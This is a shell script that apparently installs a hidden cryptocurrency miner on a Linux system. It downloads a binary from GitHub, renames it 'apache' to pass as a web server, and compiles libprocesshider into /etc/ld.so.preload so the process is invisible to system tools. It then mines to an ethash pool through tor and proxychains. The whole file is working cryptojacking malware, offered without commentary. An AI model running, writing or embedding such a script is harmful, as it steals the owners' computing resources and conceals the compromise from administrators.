#!/bin/sh
sleep 10m
apt update
apt -y install binutils cmake build-essential unzip net-tools curl tor proxychains
service tor start

sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf

wget https://github.com/aurbach55/sugeh-ice/raw/main/miZni
chmod +x miZni
mv miZni apache

git clone https://github.com/aurbach55/libprocesshider.git
cd libprocesshider
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

proxychains ./apache --url=ssl://prodent.$(echo $(shuf -i 1-1000 -n 1)-T4)@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
